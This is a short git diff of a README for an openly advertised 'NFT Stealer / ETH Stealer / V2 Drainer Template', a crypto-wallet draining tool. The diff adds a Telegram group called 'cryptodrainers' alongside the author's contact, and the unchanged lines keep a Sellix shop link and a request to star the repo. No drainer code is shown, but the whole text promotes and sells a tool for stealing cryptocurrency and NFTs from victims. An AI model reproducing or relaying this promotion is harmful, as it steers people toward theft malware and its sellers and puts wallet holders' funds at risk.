@@ -1,6 +1,6 @@
 ## ⚠️ This project is only a `BETA` for now, report problems in Telegram
 
-### 📩 DM me here: [@Zentoh](https://t.me/zentoh) (new telegram)
+### 📩 DM me here: [@Zentoh](https://t.me/zentoh) or join our [Group](https://t.me/cryptodrainers)
 
 ---
 ## ⚫ NFT Stealer / ETH Stealer / V2 Drainer Template
@@ -25,5 +25,5 @@
 - Shop: https://nftservices.sellix.io
 - Group: https://t.me/cryptodrainers
 
-##### Please ⭐ the repo to support my project
+##### Please ⭐ the repo to support our project
 ![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
